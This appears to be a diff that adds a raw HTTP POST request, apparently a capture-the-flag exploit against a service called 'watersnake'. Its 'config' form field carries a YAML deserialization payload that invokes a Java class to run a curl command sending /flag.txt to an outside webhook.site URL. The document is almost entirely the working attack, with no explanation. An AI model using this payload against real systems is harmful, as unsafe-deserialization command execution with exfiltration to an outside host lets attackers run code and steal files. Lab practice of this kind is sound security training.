@@ -1,0 +1,19 @@
+POST /update HTTP/1.1
+Host: 94.237.50.217:40798
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+Accept: */*
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Referer: http://94.237.50.217:40798/update.html
+Content-Type: multipart/form-data; boundary=---------------------------147098780736449307931692655346
+Content-Length: 313
+Origin: http://94.237.50.217:40798
+Connection: keep-alive
+Priority: u=0
+
+-----------------------------147098780736449307931692655346
+Content-Disposition: form-data; name="config"
+
+!!com.lean.watersnake.GetWaterLevel ["curl https://webhook.site/bd21ad76-6535-486b-a2e4-85722abbdea6/ -X POST --data-binary @/flag.txt"]
+
+-----------------------------147098780736449307931692655346--
